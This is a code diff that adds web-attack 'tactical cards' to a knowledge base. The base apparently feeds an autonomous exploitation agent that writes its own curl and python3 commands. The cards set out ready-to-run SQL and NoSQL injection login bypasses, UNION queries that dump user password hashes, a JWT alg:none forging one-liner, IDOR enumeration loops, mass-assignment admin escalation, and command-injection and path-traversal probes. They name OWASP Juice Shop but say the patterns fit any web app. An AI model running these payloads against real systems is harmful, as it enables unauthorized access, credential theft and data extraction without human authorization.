@@ -882,6 +882,178 @@ def main():
   Set TARGETURI to the Jenkins base path. Add "USERNAME"/"PASSWORD" if required.""",
     ))
 
+    # =====================================================================
+    # WEB LOGIC FLAWS (SPA + REST/JSON API; NO Metasploit module -> manual)
+    # Doutrina GENERICA de exploracao web-logica para alvos modernos (Juice
+    # Shop, DVWA-NG, bWAPP, APIs REST em geral). Estes bugs sao de LOGICA/
+    # INJECAO na APLICACAO - nao ha modulo MSF: a estrategia e "manual" e o
+    # TIER C (run_manual_exploit) autora curl/python3 contra a API. Exemplos
+    # citam o OWASP Juice Shop, mas os PADROES valem para qualquer app web.
+    # =====================================================================
+    cards.append(format_tactical_card(
+        name="web_logic_flaws_doctrine",
+        keywords="web application logic flaw spa rest api json owasp manual curl juice shop dvwa bwapp sqli xss auth idor no metasploit module modern webapp",
+        description="Modern web apps (SPA + REST/JSON API) have LOGIC/INJECTION bugs with NO Metasploit module -> strategy 'manual' (TIER C via curl/python3).",
+        instructions="""
+        WHEN THIS APPLIES (modern web app): a port serves HTTP(S) and WEB
+        ENUMERATION shows a Single-Page App (Angular/React/Vue: near-empty
+        index.html loading main*.js) and/or a JSON REST API (/rest/ /api/
+        /graphql; JSON responses), with NO version-specific vulnerable CMS/
+        product -> there is NO exploit_cve module.
+        STRATEGY: return "manual" (module_name empty). The TIER C loop lets you
+        author curl/python3 commands against the target's HTTP API.
+        OWASP CLASS -> read the matching card:
+          Injection SQL      -> web_sqli_injection
+          Injection NoSQL    -> web_nosql_injection
+          Broken auth / JWT  -> web_broken_auth_jwt
+          Broken access ctl  -> web_access_control_idor
+          XSS/SSTI/cmdi/LFI  -> web_xss_and_injection_misc
+        WORK request/response (no reverse shell): enumerate first
+          curl -s http://<TARGET>:<PORT>/ ; then probe /rest /api /api/v1
+          /graphql /robots.txt ; send JSON with
+          curl -s -H 'Content-Type: application/json' --data '{...}' <url> ;
+          read the JSON and adapt the next command.
+        success_check (the loop succeeds ONLY if this substring appears): pick a
+        string seen only on success - an auth token key ("authentication"/
+        "token"), a leaked admin email, a password hash, or a flag. Do NOT use
+        "uid=" for web-logic; an admin token or dumped protected data IS success.
+        """
+    ))
+
+    cards.append(format_tactical_card(
+        name="web_sqli_injection",
+        keywords="sql injection sqli auth bypass login union select or 1=1 error based curl rest api juice shop /rest/user/login",
+        description="SQL injection: authentication bypass and data extraction via curl against a web login/search endpoint. STRATEGY manual.",
+        instructions="""
+        TRIGGER: a login form or a search/filter endpoint on a web app with no
+        vulnerable-product CVE. STRATEGY (exact value): manual.
+        STEP 1 - AUTH BYPASS (classic): inject into the username/email field so the
+        WHERE clause is always true and the query is truncated with a comment.
+          Payloads to try in the identifier field: ' OR 1=1--   ' OR '1'='1'--
+          ' OR 1=1;--   admin'--   "' OR true--"  (SQLite/Juice Shop use: ' OR 1=1--)
+          JSON login example (adapt field names from the real request):
+            curl -s -H 'Content-Type: application/json' \\
+              --data '{"email":"\\' OR 1=1--","password":"x"}' \\
+              http://<TARGET>:<PORT>/rest/user/login
+          SUCCESS: response returns an auth token -> success_check: "authentication"
+          (or "token"). That token is a logged-in (often admin) session.
+        STEP 2 - DATA EXTRACTION (UNION / error-based) on a search/GET param:
+          curl -s "http://<TARGET>:<PORT>/rest/products/search?q=test')) UNION SELECT 1,email,password,4,5,6,7,8,9 FROM Users--"
+          Adjust the number of columns until the error stops (error-based column count).
+          SUCCESS: leaked emails/hashes in the JSON -> success_check: a leaked value
+          like "@" (email) or a hash prefix.
+        PITFALLS: URL-encode payloads in GET (%27 for ', %20 for space) or the shell/
+        HTTP may mangle them; in JSON, escape the quote (\\'). Different DBs differ
+        (SQLite vs MySQL vs Postgres): read the SQL ERROR echoed in the response and
+        adapt (comment syntax --, #, /* */; string concat ||, CONCAT).
+        """
+    ))
+
+    cards.append(format_tactical_card(
+        name="web_nosql_injection",
+        keywords="nosql injection mongodb operator injection $ne $gt $where json api auth bypass curl juice shop",
+        description="NoSQL/operator injection in JSON APIs (MongoDB-style): auth bypass and blind extraction. STRATEGY manual.",
+        instructions="""
+        TRIGGER: a JSON API backed by a NoSQL/Mongo store (modern Node/Express apps).
+        STRATEGY (exact value): manual.
+        AUTH BYPASS via query OPERATORS in place of a string value:
+          curl -s -H 'Content-Type: application/json' \\
+            --data '{"email":{"$ne":null},"password":{"$ne":null}}' \\
+            http://<TARGET>:<PORT>/rest/user/login
+          Also try {"$gt":""} and {"$regex":".*"}. SUCCESS: a token is returned ->
+          success_check: "token" / "authentication".
+        OPERATOR INJECTION in update/query endpoints (e.g. mass-review, order):
+          Inject {"$where":"...", "$gt":"", "$ne":""} to bypass filters or force
+          server-side evaluation. Read the JSON error to learn the backend.
+        BLIND: when no data is echoed, use a boolean/time operator and infer from the
+        HTTP status or response length changing between true/false payloads.
+        PITFALL: the field must be sent as a JSON OBJECT, not a string - keep
+        Content-Type: application/json and do NOT quote the operator object.
+        """
+    ))
+
+    cards.append(format_tactical_card(
+        name="web_broken_auth_jwt",
+        keywords="broken authentication jwt json web token alg none weak secret hmac password reset default creds oauth bearer curl juice shop",
+        description="Broken authentication: forged/weak JWT, weak-secret cracking, password-reset abuse, default creds. STRATEGY manual.",
+        instructions="""
+        TRIGGER: the app issues a JWT/bearer token (login returns a token; requests
+        carry 'Authorization: Bearer <jwt>'). STRATEGY (exact value): manual.
+        INSPECT the token: a JWT is header.payload.signature, each base64url.
+          echo '<jwt>' | cut -d. -f1 | base64 -d 2>/dev/null   # header -> read "alg"
+          echo '<jwt>' | cut -d. -f2 | base64 -d 2>/dev/null   # payload -> user/role
+        ATTACK A - alg:none: rebuild the token with header {"alg":"none","typ":"JWT"}
+          and an elevated payload (e.g. "email":"admin@..."), empty signature:
+            python3 -c "import base64,json; h=base64.urlsafe_b64encode(b'{\\"alg\\":\\"none\\",\\"typ\\":\\"JWT\\"}').rstrip(b'='); p=base64.urlsafe_b64encode(b'{\\"email\\":\\"admin@juice-sh.op\\"}').rstrip(b'='); print((h+b'.'+p+b'.').decode())"
+          Send it: curl -s -H 'Authorization: Bearer <forged>' http://<TARGET>:<PORT>/rest/user/whoami
+          SUCCESS: whoami/admin endpoint returns the elevated identity ->
+          success_check: the admin email or "isAdmin":true.
+        ATTACK B - weak HMAC secret: crack the signature offline
+          (hashcat -m 16500, or jwt_tool) with a wordlist; if cracked, mint any token.
+        ATTACK C - password reset / default creds: weak reset flows set a known
+          password for a known account; also try admin@<domain>/admin, admin/admin
+          and documented demo accounts before anything fancy.
+        PITFALL: base64url (not standard base64): pad with '=' and translate -_ to +/
+        when decoding.
+        """
+    ))
+
+    cards.append(format_tactical_card(
+        name="web_access_control_idor",
+        keywords="broken access control idor bola forced browsing admin endpoint mass assignment privilege escalation role curl juice shop basket order",
+        description="Broken access control: IDOR/BOLA, forced browsing to admin, and mass-assignment privilege escalation. STRATEGY manual.",
+        instructions="""
+        TRIGGER: endpoints that take an object id (/rest/basket/1, /api/users/5,
+        /order/42) or an admin area. STRATEGY (exact value): manual.
+        IDOR / BOLA - access another user's object by changing the id:
+          Get YOUR token (log in / register), then request neighbours' ids:
+            for i in 1 2 3 4 5; do curl -s -H 'Authorization: Bearer <jwt>' \\
+              http://<TARGET>:<PORT>/rest/basket/$i; echo; done
+          SUCCESS: you read data belonging to another user -> success_check: a value
+          that is not yours (another user's email/product).
+        FORCED BROWSING - hit admin/privileged paths directly:
+          curl -s http://<TARGET>:<PORT>/rest/admin/application-version
+          curl -s http://<TARGET>:<PORT>/#/administration   (SPA route; check the JS
+          bundle main*.js for hidden routes: curl -s .../main.js | grep -oE '/[a-z-]+')
+        MASS ASSIGNMENT / privilege escalation at registration - send extra fields the
+        UI never exposes (role/isAdmin/deluxeToken):
+          curl -s -H 'Content-Type: application/json' \\
+            --data '{"email":"a@b.c","password":"Passw0rd!","role":"admin"}' \\
+            http://<TARGET>:<PORT>/api/Users/
+          SUCCESS: the created user has elevated role -> success_check: "admin".
+        PITFALL: read the JS bundle and the 401/403 vs 200 responses - a 200 on an
+        admin path with no auth, or a role you set sticking, confirms the flaw.
+        """
+    ))
+
+    cards.append(format_tactical_card(
+        name="web_xss_and_injection_misc",
+        keywords="xss cross site scripting reflected stored dom ssti server side template command injection path traversal lfi xxe curl confirm web",
+        description="XSS and other web injections (SSTI, command injection, path traversal/LFI, XXE): how to CONFIRM each via curl. STRATEGY manual.",
+        instructions="""
+        STRATEGY (exact value): manual. For each class, send a probe and CONFIRM from
+        the response (no browser needed for confirmation).
+        XSS (reflected/stored): send a unique marker payload and check it is reflected
+          UNSANITIZED (tags intact, not HTML-encoded):
+            curl -s "http://<TARGET>:<PORT>/rest/products/search?q=<script>alert(1)</script>" | grep -o '<script>alert(1)</script>'
+          SUCCESS (reflected): the raw <script> tag appears in the response ->
+          success_check: "<script>alert(1)". Stored XSS: POST the marker to a
+          comment/review/name field, then GET the page that renders it and grep.
+        SSTI (template injection): inject a math expression in a name/template field:
+          probe {{7*7}} or ${7*7} or <%= 7*7 %>; SUCCESS if the response contains 49
+          -> success_check: "49".
+        COMMAND INJECTION: append shell metachars to a param that hits the OS:
+          ;id   |id   `id`   $(id)   -> success_check: "uid=" in the response.
+        PATH TRAVERSAL / LFI: read a known file via a file/download/path param:
+          curl -s "http://<TARGET>:<PORT>/ftp/../etc/passwd" ; or ?file=../../../../etc/passwd
+          (try ..%2f and %2500.md bypass) -> success_check: "root:x:0:0".
+        XXE: if an endpoint accepts XML, send a DOCTYPE external entity reading a
+          local file; SUCCESS if the file content is reflected.
+        PITFALL: reflection that is HTML-ENCODED (&lt;script&gt;) is NOT exploitable
+        XSS. Confirm against a benign request, do not assume.
+        """
+    ))
+
     # ---- salva ----
     output_path = os.getenv("TACTICAL_OUT", "/app/config/ingest/kb_tactical.txt")
     os.makedirs(os.path.dirname(output_path), exist_ok=True)
